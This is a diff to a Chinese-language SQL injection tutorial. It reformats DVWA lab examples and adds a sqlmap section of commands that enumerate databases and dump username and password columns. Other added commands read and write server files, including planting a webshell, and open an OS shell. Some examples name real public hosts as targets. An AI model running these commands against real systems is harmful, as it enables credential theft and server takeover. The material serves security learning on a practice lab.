@@ -85,8 +85,8 @@ Fuzz注入点
 --------------------------------------
 	
 - 判断数据库表是否存在
-	``and exsits (select * from admin)`` MySQL
-	如：http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' and exists+(select * from guestbook)--+&Submit=Submit#
+	| ``and exsits (select * from admin)`` MySQL
+	| 如：``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' and exists+(select * from guestbook)--+&Submit=Submit#``
 - 确定字段数
     order by(MySQL)
 	例如 ``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' order by 6--+&Submit=Submit#`` ，不断增加数字，直到返回错误
@@ -202,4 +202,32 @@ MYSQL实战
 		ID: 1' union select user_id,password from users-- 
 		First name: 6
 		Surname: ee11cbb19052e40b07aac0ca060c23ee
-	
+
+sqlmap教程
+--------------------------------------
+- 默认使用level1检测全部数据库类型
+	``sqlmap -u http://www.vuln.cn/post.php?id=1`` 
+- 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+	``sqlmap -u http://www.vuln.cn/post.php?id=1  –dbms mysql –level 3``
+- cookie注入
+	``sqlmap -u http://www.baidu.com/shownews.asp –cookie “id=11” –level 2``
+- 从POST数据包注入
+	``sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql`` 
+- 获取数据库基本信息
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs``
+- 查询有哪些数据库
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables``
+- 查询test数据库中有哪些表
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns``
+- 查询test数据库中admin表有哪些字段
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump``
+- 在dedecms数据库中搜索字段admin或者password
+	``sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password``
+- 读取与写入文件
+	| 首先找需要网站的物理路径，其次需要有可写或可读权限.
+	| –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
+	| –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
+	| –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	| ``sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”``
+- 使用shell命令
+	``sqlmap -r “c:\tools\request.txt” -p id –dms mysql –-os-shell``
